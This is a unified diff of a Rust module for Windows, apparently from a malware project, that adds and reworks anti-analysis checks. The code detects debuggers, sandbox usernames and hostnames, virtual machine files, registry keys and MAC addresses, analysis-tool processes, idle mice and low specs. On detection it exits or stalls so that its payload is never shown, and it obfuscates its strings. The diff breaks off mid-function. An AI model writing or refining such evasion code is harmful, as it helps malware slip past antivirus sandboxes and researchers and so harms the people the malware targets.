@@ -1,60 +1,64 @@
 #![allow(dead_code)]
+
 use std::path::Path;
 use std::time::Duration;
-use std::ffi::c_void;
 
 use windows::core::w;
-use windows::Win32::Foundation::{BOOL, CloseHandle, HANDLE, HWND, LPARAM, MAX_PATH, POINT};
+use windows::Win32::Foundation::POINT;
 use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
 use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
-use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameW};
-use windows::Win32::System::SystemInformation::{
-    GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX,
-};
-use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, GetCurrentProcess};
-use windows::Win32::UI::WindowsAndMessaging::{
-    EnumWindows, GetSystemMetrics, GetWindowTextW, SM_CXSCREEN, SM_CYSCREEN, SM_REMOTESESSION,
-};
-use windows::Win32::Graphics::Gdi::{
-    GetDC, GetDeviceCaps, VREFRESH, ReleaseDC,
-};
-use windows::Win32::NetworkManagement::IpHelper::{
-    GetAdaptersInfo, IP_ADAPTER_INFO,
-};
+use windows::Win32::System::SystemInformation::{GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX};
+use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_REMOTESESSION, GetCursorPos};
+use windows::Win32::Graphics::Gdi::{GetDC, GetDeviceCaps, VREFRESH, ReleaseDC};
+use windows::Win32::NetworkManagement::IpHelper::{GetAdaptersInfo, IP_ADAPTER_INFO};
 use windows::Win32::System::Registry::{
-    RegOpenKeyExW, RegQueryInfoKeyW, RegQueryValueExW, RegCloseKey, HKEY_LOCAL_MACHINE, KEY_READ, HKEY, REG_VALUE_TYPE,
-};
-use windows::Win32::System::Com::{
-    CoCreateInstance, CoInitializeEx, CoUninitialize, CoTaskMemFree, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
-};
-use windows::Win32::Media::MediaFoundation::{
-    MFTEnumEx, MFT_CATEGORY_VIDEO_ENCODER, MFT_ENUM_FLAG_HARDWARE, MFT_REGISTER_TYPE_INFO,
-    MFStartup, MFShutdown, MFCreateMediaType, MFCreateSinkWriterFromURL, MFCreateAttributes,
-    MFMediaType_Video, MFVideoFormat_H264, MFVideoFormat_RGB32, MFVideoInterlace_Progressive,
-    MF_VERSION, MFSTARTUP_FULL, MF_MT_MAJOR_TYPE, MF_MT_SUBTYPE, MF_MT_AVG_BITRATE,
-    MF_MT_FRAME_SIZE, MF_MT_FRAME_RATE, MF_MT_INTERLACE_MODE, MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS,
-    IMFActivate, IMFMediaType, IMFAttributes,
-};
-use windows::Win32::Security::{
-    GetTokenInformation, TokenElevation, TOKEN_QUERY, TOKEN_ELEVATION, CheckTokenMembership,
+    RegOpenKeyExW, RegQueryInfoKeyW, RegCloseKey, 
+    HKEY_LOCAL_MACHINE, KEY_READ, HKEY,
 };
 
 use crate::utils::cpuid::CpuId;
 use crate::core::exit_patcher::safe_exit;
 
+// Debug-only file logging for anti analysis
+#[cfg(debug_assertions)]
+fn aa_log(msg: &str) {
+    use std::io::Write;
+    let log_path = std::env::temp_dir().join("kurinium_aa.log");
+    if let Ok(mut file) = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&log_path) 
+    {
+        let timestamp = chrono::Local::now().format("%H:%M:%S%.3f");
+        let _ = writeln!(file, "[{}] {}", timestamp, msg);
+    }
+}
+
+#[cfg(not(debug_assertions))]
+fn aa_log(_msg: &str) {
+    // No-op in release builds
+}
+
+macro_rules! aa_log {
+    ($($arg:tt)*) => {
+        aa_log(&format!($($arg)*))
+    };
+}
+
+// Evasion actions when analysis detected
 #[derive(Debug, Clone, Copy, PartialEq)]
 pub enum EvasionAction {
-    ExitSilently,  // exit immediately
-    DelayThenExit, // rand wait and exit
-    ReportOnly,    // do nothing, just return result
-    FakeBehavior,  // do normal behavior (not run payload)
-    InfiniteSleep, // sleep forever (looks idle, not evasive)
+    ExitSilently,
+    DelayThenExit,
+    ReportOnly,
+    InfiniteSleep,
 }
 
 pub struct AntiAnalysisConfig {
     pub min_score_threshold: u32,
     pub action: EvasionAction,
     pub delay_range: (u64, u64),
+    pub startup_delay: bool,
 }
 
 impl Default for AntiAnalysisConfig {
@@ -63,6 +67,7 @@ impl Default for AntiAnalysisConfig {
             min_score_threshold: 50,
             action: EvasionAction::DelayThenExit,
             delay_range: (30, 120),
+            startup_delay: true,
         }
     }
 }
@@ -81,79 +86,6 @@ pub struct DetectionResult {
     pub detections: Vec<DetectionItem>,
 }
 
-pub fn run_checks(config: &AntiAnalysisConfig) -> DetectionResult {
-    let mut result = DetectionResult::default();
-
-    check_desktop (&mut result);  // check for rtf format
-    check_testmode(&mut result);  // check for testmode
-    check_uptime  (&mut result);  // check for uptime
-    check_debugger(&mut result);  // check for debugger
-    check_blu     (&mut result);  // check for blacklisted users
-    
-    if result.total_score >= config.min_score_threshold {
-        result.is_detected = true;
-        return result;
-    }
-
-    check_syspec  (&mut result);  // check for ram/disk
-    check_cpu     (&mut result);  // check the cpuid
-    check_cpu     (&mut result);  // check the cpuid
-    // check_network (&mut result);  // check adapter info (Disabled: FP with Hyper-V)
-    check_usbh    (&mut result);  // check registry enum
-    check_usbh    (&mut result);  // check registry enum
-    check_blp     (&mut result);  // check process blacklist
-    check_mact    (&mut result);  // check mac address
-    check_drr     (&mut result);  // check display refresh
-
-    if result.total_score >= config.min_score_threshold {
-        result.is_detected = true;
-        return result;
-    }
-
-    check_hwe     (&mut result);  // check for hardware encoder
-
-    result.is_detected = result.total_score >= config.min_score_threshold;
-    result
-}
-
-#[allow(dead_code)]
-pub fn run_and_evade(config: &AntiAnalysisConfig) -> bool {
-    let result = run_checks(config);
-
-    if result.is_detected {
-        match config.action {
-            EvasionAction::ExitSilently => {
-                safe_exit(0);
-            }
-            EvasionAction::DelayThenExit => {
-                random_delay(config.delay_range);
-                safe_exit(0);
-            }
-            EvasionAction::FakeBehavior => {
-                fake_behavior();
-                safe_exit(0);
-            }
-            EvasionAction::InfiniteSleep => {
-                loop {
-                    std::thread::sleep(std::time::Duration::from_secs(3600));
-                }
-            }
-            EvasionAction::ReportOnly => {
-                return true;
-            }
-        }
-    }
-
-    false
-}
-
-pub fn random_delay(range: (u64, u64)) {
-    use std::time::{SystemTime, UNIX_EPOCH};
-    let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos() as u64;
-    let delay_secs = range.0 + (seed % (range.1 - range.0 + 1));
-    std::thread::sleep(Duration::from_secs(delay_secs));
-}
-
 fn add_detection(result: &mut DetectionResult, category: &str, reason: &str, weight: u32) {
     result.detections.push(DetectionItem {
         category: category.to_string(),
@@ -163,290 +95,186 @@ fn add_detection(result: &mut DetectionResult, category: &str, reason: &str, wei
     result.total_score += weight;
 }
 
-fn check_hwe(result: &mut DetectionResult) {
-    let is_real_hardware = unsafe { check_hardware_authenticity_inner() };
-    if !is_real_hardware {
-        add_detection(result, "Hardware", "No Real Hardware Encoder (MFT Pipeline Failed)", 100);
+pub fn random_delay(range: (u64, u64)) {
+    use std::time::{SystemTime, UNIX_EPOCH};
+    let seed = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or(Duration::ZERO)
+        .as_nanos() as u64;
+    let delay_secs = range.0 + (seed % (range.1 - range.0 + 1));
+    std::thread::sleep(Duration::from_secs(delay_secs));
+}
+
+fn run_check<F>(result: &mut DetectionResult, name: &str, check_fn: F) 
+where F: FnOnce(&mut DetectionResult) 
+{
+    let before = result.total_score;
+    check_fn(result);
+    let after = result.total_score;
+    
+    if after > before {
+        aa_log!("{} [FAIL +{}]", name, after - before);
+    } else {
+        aa_log!("{} [PASS]", name);
     }
 }
 
-struct MfSession {
-    com_initialized: bool,
-    mf_started: bool,
-}
+pub fn run_checks(config: &AntiAnalysisConfig) -> DetectionResult {
+    let mut result = DetectionResult::default();
+    aa_log!("Running checks...");
 
-impl MfSession {
-    unsafe fn new() -> windows::core::Result<Self> {
-        if CoInitializeEx(None, COINIT_MULTITHREADED).is_err() {
-            return Err(windows::core::Error::from_win32());
-        }
-
-        match MFStartup(MF_VERSION, MFSTARTUP_FULL) {
-            Ok(_) => Ok(Self {
-                com_initialized: true,
-                mf_started: true,
-            }),
-            Err(e) => {
-                CoUninitialize();
-                Err(e)
-            }
-        }
-    }
-}
-
-impl Drop for MfSession {
-    fn drop(&mut self) {
-        unsafe {
-            if self.mf_started {
-                let _ = MFShutdown();
-            }
-            if self.com_initialized {
-                CoUninitialize();
-            }
-        }
-    }
-}
-
-unsafe fn check_hardware_authenticity_inner() -> bool {
-    let _guard = match MfSession::new() {
-        Ok(g) => g,
-        Err(_) => return false,
-    };
-
-    let has_hw_encoder = check_hw_encoders().map(|count| count > 0).unwrap_or(false);
-    if !has_hw_encoder {
-        return false;
+    if config.startup_delay {
+        let jitter = (std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or(Duration::ZERO)
+            .as_millis() % 2000) as u64 + 1000;
+        aa_log!("Startup delay: {}ms", jitter);
+        std::thread::sleep(Duration::from_millis(jitter));
     }
 
-    try_hw_h264_pipeline().unwrap_or(false)
-}
+    aa_log!("Quick checks==========");
+    run_check(&mut result, "Debugger", check_debugger);
+    run_check(&mut result, "Username", check_username);
+    run_check(&mut result, "Uptime", check_uptime);
+    
+    if result.total_score >= config.min_score_threshold {
+        aa_log!("Early exit - Score: {}/{}", result.total_score, config.min_score_threshold);
+        result.is_detected = true;
+        return result;
+    }
 
-unsafe fn check_hw_encoders() -> windows::core::Result<u32> {
-    let mut count: u32 = 0;
-    let mut activates: *mut Option<IMFActivate> = std::ptr::null_mut();
+    aa_log!("Hardware/Environment checks==========");
+    run_check(&mut result, "System specs", check_specs);
+    run_check(&mut result, "CPU", check_cpu);
+    run_check(&mut result, "Network/MAC", check_network);
+    run_check(&mut result, "USB history", check_usb_history);
+    run_check(&mut result, "Display", check_display);
+    
+    if result.total_score >= config.min_score_threshold {
+        aa_log!("Early exit - Score: {}/{}", result.total_score, config.min_score_threshold);
+        result.is_detected = true;
+        return result;
+    }
 
-    let output_info = MFT_REGISTER_TYPE_INFO {
-        guidMajorType: MFMediaType_Video,
-        guidSubtype: MFVideoFormat_H264,
-    };
+    aa_log!("VM artifacts checks==========");
+    run_check(&mut result, "VM files", check_vm_files);
+    run_check(&mut result, "VM registry", check_vm_registry);
+    run_check(&mut result, "Processes", check_processes);
+    run_check(&mut result, "Antivirus", check_antivirus);
+    
+    aa_log!("Timing attack checks==========");
+    run_check(&mut result, "Timing attack", check_timing);
 
-    let res = MFTEnumEx(
-        MFT_CATEGORY_VIDEO_ENCODER,
-        MFT_ENUM_FLAG_HARDWARE,
-        None,
-        Some(&output_info),
-        &mut activates,
-        &mut count,
+    result.is_detected = result.total_score >= config.min_score_threshold;
+    aa_log!("Complete - Score: {}/{} - {}", 
+        result.total_score, 
+        config.min_score_threshold,
+        if result.is_detected { "DETECTED" } else { "CLEAN" }
     );
+    result
+}
 
-    if res.is_ok() && !activates.is_null() {
-        for i in 0..count as usize {
-            std::ptr::drop_in_place(activates.add(i));
+pub fn run_and_evade(config: &AntiAnalysisConfig) -> bool {
+    let result = run_checks(config);
+
+    if result.is_detected {
+        match config.action {
+            EvasionAction::ExitSilently => safe_exit(0),
+            EvasionAction::DelayThenExit => {
+                random_delay(config.delay_range);
+                safe_exit(0);
+            }
+            EvasionAction::InfiniteSleep => loop {
+                std::thread::sleep(Duration::from_secs(3600));
+            },
+            EvasionAction::ReportOnly => return true,
         }
-        CoTaskMemFree(Some(activates as *const _));
+    }
+    false
+}
+
+fn check_debugger(result: &mut DetectionResult) {
+    if unsafe { IsDebuggerPresent().as_bool() } {
+        add_detection(result, "Debugger", "IsDebuggerPresent", 100);
     }
 
-    res.map(|_| count)
-}
-
-unsafe fn try_hw_h264_pipeline() -> windows::core::Result<bool> {
-    let mut attributes: Option<IMFAttributes> = None;
-    MFCreateAttributes(&mut attributes, 1)?;
-
-    let Some(attributes) = attributes else {
-        return Ok(false);
-    };
-
-    let _ = attributes.SetUINT32(&MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, 1);
-
-    let path_to_use = pick_probe_path();
-    let _delete_probe = FileDeleteGuard::new(path_to_use.clone());
-
-    let output_path: Vec<u16> = path_to_use.encode_utf16().chain(Some(0)).collect();
-    let writer = MFCreateSinkWriterFromURL(windows::core::PCWSTR(output_path.as_ptr()), None, &attributes)?;
-
-    let output_mt = create_h264_type()?;
-    let stream_idx = writer.AddStream(&output_mt)?;
-
-    let input_mt = create_input_type()?;
-    let _ = writer.SetInputMediaType(stream_idx, &input_mt, None);
-
-    Ok(writer.BeginWriting().is_ok())
-}
-
-fn pick_probe_path() -> String {
-    let preferred = obfstr::obfstr!("C:\\Windows\\Temp\\hw_probe.mp4").to_string();
-    if std::fs::write(&preferred, b"").is_ok() {
-        let _ = std::fs::remove_file(&preferred);
-        return preferred;
-    }
-
-    std::env::temp_dir()
-        .join("hw_probe.mp4")
-        .to_string_lossy()
-        .to_string()
-}
-
-struct FileDeleteGuard {
-    path: String,
-}
-
-impl FileDeleteGuard {
-    fn new(path: String) -> Self {
-        Self { path }
-    }
-}
-
-impl Drop for FileDeleteGuard {
-    fn drop(&mut self) {
-        let _ = std::fs::remove_file(&self.path);
-    }
-}
-
-unsafe fn create_h264_type() -> windows::core::Result<IMFMediaType> {
-    let mt = MFCreateMediaType()?;
-    mt.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
-    mt.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_H264)?;
-    mt.SetUINT32(&MF_MT_AVG_BITRATE, 4_000_000)?;
-    mt.SetUINT64(&MF_MT_FRAME_SIZE, ((1280u64) << 32) | 720u64)?;
-    mt.SetUINT64(&MF_MT_FRAME_RATE, ((30u64) << 32) | 1u64)?;
-    mt.SetUINT32(&MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive.0 as u32)?;
-    Ok(mt)
-}
-
-unsafe fn create_input_type() -> windows::core::Result<IMFMediaType> {
-    let mt = MFCreateMediaType()?;
-    mt.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
-    mt.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_RGB32)?;
-    mt.SetUINT64(&MF_MT_FRAME_SIZE, ((1280u64) << 32) | 720u64)?;
-    Ok(mt)
-}
-
-fn check_drr(result: &mut DetectionResult) {
+    #[cfg(target_arch = "x86_64")]
     unsafe {
-        let hdc = GetDC(None);
-        let refresh_rate = GetDeviceCaps(Some(hdc), VREFRESH);
+        let peb: *const u8;
+        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+        if !peb.is_null() {
+            let being_debugged = *peb.add(2);
+            if being_debugged != 0 {
+                add_detection(result, "Debugger", "PEB BeingDebugged", 100);
+            }
+        }
+    }
+}
+
+fn check_mouse(result: &mut DetectionResult) {
+    unsafe {
+        let mut p1 = POINT::default();
+        let mut p2 = POINT::default();
         
-        ReleaseDC(None, hdc);
-
-        if refresh_rate < 25 {
-            add_detection(result, "Display", &format!("Low Refresh Rate: {} Hz", refresh_rate), 40);
-        }
-    }
-
-    unsafe {
-        if GetSystemMetrics(SM_REMOTESESSION) != 0 {
-             add_detection(result, "Display", "Remote Session Detected (RDP)", 60);
-        }
-    }
-}
-
-fn check_network(_result: &mut DetectionResult) {
-    // Disabled to prevent False Positives with Hyper-V / Virtual Ethernet Adapters
-}
-
-fn check_usbh(result: &mut DetectionResult) {
-    let keys_to_check = [
-        r"SYSTEM\CurrentControlSet\Enum\USBSTOR",
-        r"SYSTEM\CurrentControlSet\Enum\USB",
-    ];
-
-    for key in keys_to_check {
-        unsafe {
-            let mut hkey: HKEY = HKEY::default();
-            let wide_key = windows::core::HSTRING::from(key);
-            
-            let opened = RegOpenKeyExW(
-                HKEY_LOCAL_MACHINE, 
-                windows::core::PCWSTR::from_raw(wide_key.as_ptr()), 
-                Some(0), 
-                KEY_READ, 
-                &mut hkey
-            );
-
-            if opened.is_ok() {
-                let mut subkeys_count: u32 = 0;
-                let _ = RegQueryInfoKeyW(
-                    hkey,
-                    Some(windows::core::PWSTR::null()),
-                    None,
-                    None,
-                    Some(&mut subkeys_count),
-                    None,
-                    None,
-                    None,
-                    None,
-                    None,
-                    None,
-                    None,
-                );
-                
-                if key.contains("USBSTOR") && subkeys_count == 0 {
-                    add_detection(result, "Environment", "No USB Storage history detected", 30);
+        if GetCursorPos(&mut p1).is_ok() {
+            std::thread::sleep(Duration::from_millis(500));
+            if GetCursorPos(&mut p2).is_ok() {
+                if p1.x == p2.x && p1.y == p2.y {
+                    add_detection(result, "Interaction", "No mouse movement", 25);
                 }
-
-                let _ = CloseHandle(HANDLE(hkey.0 as isize as *mut c_void));
             }
         }
     }
 }
 
-fn check_syspec(result: &mut DetectionResult) {
+fn check_input_idle(result: &mut DetectionResult) {
     unsafe {
-        let mut mem_status = MEMORYSTATUSEX::default();
-        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
-        if GlobalMemoryStatusEx(&mut mem_status).is_ok() {
-            let total_gb_val = mem_status.ullTotalPhys as f64 / (1024.0 * 1024.0 * 1024.0);
-            if total_gb_val < 3.5 {
-                add_detection(result, "Specs", &format!("Low RAM: {:.2} GB", total_gb_val), 60);
-            }
-            
-            if total_gb_val > 4.8 && total_gb_val < 5.2 {
-                add_detection(result, "Specs", &format!("Suspicious RAM size: {:.2} GB (Likely VM Config)", total_gb_val), 80);
-            }
-        }
-    }
-
-    unsafe {
-        let mut free_bytes_available = 0u64;
-        let mut total_number_of_bytes = 0u64;
-        let mut total_number_of_free_bytes = 0u64;
+        let mut positions: Vec<(i32, i32)> = Vec::new();
         
-        let path = w!("C:\\");
-        if GetDiskFreeSpaceExW(
-            path,
-            Some(&mut free_bytes_available),
-            Some(&mut total_number_of_bytes),
-            Some(&mut total_number_of_free_bytes),
-        ).is_ok() {
-            let total_gb = total_number_of_bytes / (1024 * 1024 * 1024);
-            
-            if total_gb < 60 {
-                add_detection(result, "Specs", &format!("Small Disk: {} GB", total_gb), 50);
+        for _ in 0..3 {
+            let mut pt = POINT::default();
+            if GetCursorPos(&mut pt).is_ok() {
+                positions.push((pt.x, pt.y));
             }
-
-            let suspicious_sizes = [60, 70, 80, 90, 100, 110];
-            let safe_sizes = [64, 128, 250, 256, 500, 512]; // Common SSD sizes
-
-            let mut is_suspicious = false;
-            let mut is_safe = false;
-
-            for &bad in &suspicious_sizes {
-                if total_gb >= (bad - 2) && total_gb <= (bad + 2) {
-                    is_suspicious = true;
-                    break;
-                }
+            std::thread::sleep(Duration::from_millis(500));
+        }
+        
+        if positions.len() >= 3 {
+            let all_same = positions.windows(2).all(|w| w[0] == w[1]);
+            if all_same {
+                add_detection(result, "Interaction", "Cursor completely static", 30);
             }
+        }
+    }
+}
 
-            for &safe in &safe_sizes {
-                if total_gb >= (safe - 2) && total_gb <= (safe + 2) {
-                    is_safe = true;
-                    break;
-                }
+fn check_username(result: &mut DetectionResult) {
+    if let Ok(user) = std::env::var(obfstr::obfstr!("USERNAME")) {
+        let lower = user.to_lowercase();
+        
+        let blacklist = [
+            "sandbox", "virus", "malware", "test",
+            "currentuser", "username", "john", "emily", "george", 
+            "bruno", "dekker", "willcarter", "miller", "johnson",
+            "hong lee", "joe blow", "john doe", "hans gruber", "hal9th",
+        ];
+        
+        for &name in &blacklist {
+            if lower == name || lower.contains(name) {
+                add_detection(result, "User", &format!("Suspicious username: {}", user), 60);
+                break;
             }
-
-            if is_suspicious && !is_safe {
-                add_detection(result, "Specs", &format!("Suspicious Disk Size: {} GB (Likely specific VM alloc)", total_gb), 70);
+        }
+    }
+    
+    if let Ok(host) = std::env::var(obfstr::obfstr!("COMPUTERNAME")) {
+        let lower = host.to_lowercase();
+        let blacklist = ["sandbox", "user-pc", "malware", "virus", "analysis"];
+        
+        for &name in &blacklist {
+            if lower.contains(name) {
+                add_detection(result, "User", &format!("Suspicious hostname: {}", host), 40);
+                break;
             }
         }
     }
@@ -455,91 +283,125 @@ fn check_syspec(result: &mut DetectionResult) {
 fn check_uptime(result: &mut DetectionResult) {
     unsafe {
         let tick = GetTickCount64();
+        let minutes = tick / 60000;
+        
+        if minutes < 5 {
+            add_detection(result, "Timing", "System uptime < 5 min", 40);
+        }
+        
         let days = tick / (1000 * 60 * 60 * 24);
-        if days > 20 {
-            add_detection(result, "Heuristic", &format!("High Uptime: {} days (Possible Snapshot)", days), 50);
+        if days > 30 {
+            add_detection(result, "Timing", &format!("Uptime {} days (snapshot?)", days), 30);
+        }
+    }
+}
+
+fn check_specs(result: &mut DetectionResult) {
+    unsafe {
+        let mut mem = MEMORYSTATUSEX::default();
+        mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
+        if GlobalMemoryStatusEx(&mut mem).is_ok() {
+            let gb = mem.ullTotalPhys as f64 / (1024.0 * 1024.0 * 1024.0);
+            if gb < 3.5 {
+                add_detection(result, "Specs", &format!("Low RAM: {:.1} GB", gb), 50);
+            }
+        }
+    }
+    unsafe {
+        let mut total: u64 = 0;
+        if GetDiskFreeSpaceExW(w!("C:\\"), None, Some(&mut total), None).is_ok() {
+            let gb = total / (1024 * 1024 * 1024);
+            if gb < 60 {
+                add_detection(result, "Specs", &format!("Small disk: {} GB", gb), 40);
+            }
         }
     }
 }
 
 fn check_cpu(result: &mut DetectionResult) {
     let cpu = CpuId::get();
-    let cores = cpu.cores;
-    let brand = cpu.brand.to_lowercase();
-
-    if cores < 2 {
-        add_detection(result, "Hardware", &format!("CPU Core Count: {} (Too Low)", cores), 90);
+    
+    if cpu.cores < 2 {
+        add_detection(result, "Hardware", &format!("Only {} core(s)", cpu.cores), 80);
     }
-
-    if (brand.contains("i9") || brand.contains("ryzen 9")) && cores < 6 {
-         add_detection(result, "Hardware", &format!("CPU Mismatch: High-end brand '{}' but only {} cores", cpu.brand, cores), 100);
-    } else if (brand.contains("i7") || brand.contains("ryzen 7")) && cores < 4 {
-         add_detection(result, "Hardware", &format!("CPU Mismatch: High-end brand '{}' but only {} cores", cpu.brand, cores), 80);
-    } else if (brand.contains("xeon") || brand.contains("threadripper")) && cores < 4 {
-         add_detection(result, "Hardware", &format!("CPU Mismatch: Server brand '{}' but only {} cores", cpu.brand, cores), 100);
+    
+    let brand = cpu.brand.to_lowercase();
+    
+    if (brand.contains("i7") || brand.contains("ryzen 7")) && cpu.cores < 4 {
+        add_detection(result, "Hardware", "CPU brand/core mismatch", 90);
     }
 }
 
-fn check_desktop(result: &mut DetectionResult) {
-    if let Ok(user_profile) = std::env::var("USERPROFILE") {
-        let desktop_path = Path::new(&user_profile).join("Desktop");
-        if desktop_path.exists() {
-            if let Ok(entries) = std::fs::read_dir(desktop_path) {
-                let rtf_count = entries
-                    .filter_map(|e| e.ok())
-                    .filter(|e| {
-                        if let Ok(fname) = e.file_name().into_string() {
-                            fname.to_lowercase().ends_with(".rtf")
-                        } else {
-                            false
-                        }
-                    })
-                    .count();
+fn check_display(result: &mut DetectionResult) {
+    unsafe {
+        let hdc = GetDC(None);
+        let refresh = GetDeviceCaps(Some(hdc), VREFRESH);
+        ReleaseDC(None, hdc);
+        
+        if refresh > 0 && refresh < 30 {
+            add_detection(result, "Display", &format!("Low refresh: {} Hz", refresh), 30);
+        }
+    }    
+    unsafe {
+        if GetSystemMetrics(SM_REMOTESESSION) != 0 {
+            add_detection(result, "Display", "RDP session detected", 60);
+        }
+    }
+}
 
-                if rtf_count > 1 {
-                    add_detection(result, "Heuristic", &format!("Suspicious Desktop: {} RTF files found", rtf_count), 100);
+fn check_network(result: &mut DetectionResult) {
+    let mut size: u32 = 15000;
+    let mut buf: Vec<u8> = vec![0; size as usize];
+    
+    let mut detected_vbox = false;
+    let mut detected_kvm = false;
+    
+    unsafe {
+        if GetAdaptersInfo(Some(buf.as_mut_ptr() as *mut IP_ADAPTER_INFO), &mut size) == 0 {
+            let mut ptr = buf.as_ptr() as *const IP_ADAPTER_INFO;
+            while !ptr.is_null() {
+                let adapter = *ptr;
+                let mac = &adapter.Address[0..3];
+                match (mac[0], mac[1], mac[2]) {
+                    (0x08, 0x00, 0x27) => {
+                        if !detected_vbox {
+                            add_detection(result, "Network", "VirtualBox MAC", 80);
+                            detected_vbox = true;
+                        }
+                    }
+                    (0x52, 0x54, 0x00) => {
+                        if !detected_kvm {
+                            add_detection(result, "Network", "KVM/QEMU MAC", 80);
+                            detected_kvm = true;
+                        }
+                    }
+                    _ => {}
                 }
+                
+                ptr = adapter.Next;
             }
         }
     }
 }
 
-fn check_testmode(result: &mut DetectionResult) {
-    let key = r"SYSTEM\CurrentControlSet\Control";
+fn check_usb_history(result: &mut DetectionResult) {
     unsafe {
         let mut hkey: HKEY = HKEY::default();
-        let wide_key = windows::core::HSTRING::from(key);
+        let key = windows::core::HSTRING::from(r"SYSTEM\CurrentControlSet\Enum\USBSTOR");
         
-        let opened = RegOpenKeyExW(
-            HKEY_LOCAL_MACHINE, 
-            windows::core::PCWSTR::from_raw(wide_key.as_ptr()), 
-            Some(0), 
-            KEY_READ, 
+        if RegOpenKeyExW(
+            HKEY_LOCAL_MACHINE,
+            windows::core::PCWSTR::from_raw(key.as_ptr()),
+            Some(0),
+            KEY_READ,
             &mut hkey
-        );
-
-        if opened.is_ok() {
-            let value_name = w!("SystemStartOptions");
-            let mut buffer_size: u32 = 1024;
-            let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
-            let mut val_type = REG_VALUE_TYPE::default();
-
-            let query = RegQueryValueExW(
-                hkey,
-                windows::core::PCWSTR::from_raw(value_name.as_ptr()),
-                None, 
-                Some(&mut val_type),
-                Some(buffer.as_mut_ptr()),    
-                Some(&mut buffer_size)
-            );
-
-            if query.is_ok() {
-                let slice = std::slice::from_raw_parts(buffer.as_ptr() as *const u16, (buffer_size / 2) as usize);
-                let opts = String::from_utf16_lossy(slice).to_lowercase();
-                
-                if opts.contains("testsigning") {
-                    add_detection(result, "System", "Windows Test Mode Enabled (TESTSIGNING)", 80);
-                }
+        ).is_ok() {
+            let mut count: u32 = 0;
+            let _ = RegQueryInfoKeyW(hkey, None, None, None, Some(&mut count), 
+                None, None, None, None, None, None, None);
+            
+            if count == 0 {
+                add_detection(result, "Environment", "No USB storage history", 35);
             }
             
             let _ = RegCloseKey(hkey);
@@ -547,84 +409,191 @@ fn check_testmode(result: &mut DetectionResult) {
     }
 }
 
-fn check_debugger(result: &mut DetectionResult) {
-    if unsafe { IsDebuggerPresent().as_bool() } {
-        add_detection(result, "Debugger", "IsDebuggerPresent() == true", 100);
+fn check_vm_files(result: &mut DetectionResult) {
+    let vm_files = [
+        // VirtualBox
+        (r"C:\Windows\System32\drivers\VBoxMouse.sys", "VirtualBox"),
+        (r"C:\Windows\System32\drivers\VBoxGuest.sys", "VirtualBox"),
+        (r"C:\Windows\System32\vboxservice.exe", "VirtualBox"),
+        (r"C:\Windows\System32\vboxtray.exe", "VirtualBox"),
+        // VMware
+        (r"C:\Windows\System32\drivers\vmmouse.sys", "VMware"),
+        (r"C:\Windows\System32\drivers\vmhgfs.sys", "VMware"),
+        (r"C:\Windows\System32\drivers\vmci.sys", "VMware"),
+    ];
+    
+    for (path, vm) in vm_files {
+        if Path::new(path).exists() {
+            add_detection(result, "VM", &format!("{} file found", vm), 90);
+            return;
+        }
     }
 }
 
-fn check_blp(result: &mut DetectionResult) {
-    let running = get_running_processes();
-    let mut found_count = 0;
+fn check_vm_registry(result: &mut DetectionResult) {
+    let vm_keys = [
+        (r"SOFTWARE\Oracle\VirtualBox Guest Additions", "VirtualBox"),
+        (r"SOFTWARE\VMware, Inc.\VMware Tools", "VMware"),
+        (r"SOFTWARE\Wine", "Wine"),
+        (r"HARDWARE\ACPI\DSDT\VBOX__", "VirtualBox"),
+        (r"HARDWARE\ACPI\FADT\VBOX__", "VirtualBox"),
+    ];
+    
+    for (key, vm) in vm_keys {
+        unsafe {
+            let mut hkey: HKEY = HKEY::default();
+            let wide = windows::core::HSTRING::from(key);
+            
+            if RegOpenKeyExW(
+                HKEY_LOCAL_MACHINE,
+                windows::core::PCWSTR::from_raw(wide.as_ptr()),
+                Some(0),
+                KEY_READ,
+                &mut hkey
+            ).is_ok() {
+                let _ = RegCloseKey(hkey);
+                add_detection(result, "VM", &format!("{} registry key", vm), 90);
+                return;
+            }
+        }
+    }
+}
 
-    for p in &running {
+fn check_processes(result: &mut DetectionResult) {
+    let procs = crate::utils::syscall::get_filtered_process_names();
+    
+    // Analysis tools
+    let analysis = [
+        "wireshark.exe", "fiddler.exe", "x64dbg.exe", "x32dbg.exe",
+        "ollydbg.exe", "ida.exe", "ida64.exe", "ghidra.exe",
+        "processhacker.exe", "procmon.exe", "procexp.exe",
+        "regmon.exe", "filemon.exe", "autoruns.exe",
+        "tcpview.exe", "dumpcap.exe", "httpdebugger.exe",
+        "resourcehacker.exe", "peid.exe", "lordpe.exe",
+        "frida.exe", "cheatengine.exe"
+    ];
+    
+    // VM processes
+    let vm_procs = [
+        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
+        "vboxservice.exe", "vboxtray.exe", "vgauthservice.exe",
+        "qemu-ga.exe", "prl_tools.exe", "prl_cc.exe",
+        "xenservice.exe", "vmsrvc.exe", "vmusrvc.exe"
+    ];
+    
+    for p in &procs {
         let lower = p.to_lowercase();
         
-        let is_blacklisted = 
-            lower == obfstr::obfstr!("wireshark.exe") ||
-            lower == obfstr::obfstr!("fiddler.exe") ||
